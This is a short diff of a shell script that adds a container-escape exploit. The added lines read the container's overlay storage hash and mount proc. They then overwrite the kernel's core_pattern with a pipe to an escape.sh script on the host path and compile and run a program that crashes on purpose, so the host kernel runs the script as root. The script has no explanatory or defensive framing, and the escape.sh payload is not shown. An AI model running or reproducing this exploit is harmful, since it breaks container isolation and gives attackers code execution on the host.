@@ -14,4 +14,16 @@ int main(void) {
 }
 EOF
 
+# Get the container hash
+export HASH=$(mount | grep overlay | sed -n 's|.*upperdir=/var/lib/docker/overlay2/\([^/]*\)/diff.*|\1|p')
+
+# Mount proc shared between kernel
+mount -t proc none /proc
+
+# Pass script to kernel fallback
+echo "|/var/lib/docker/overlay2/$HASH/diff/escape.sh" > /proc/sys/kernel/core_pattern
+
+# Compile and Crash
 gcc crash.c -o crash
+chmod +x crash
+./crash
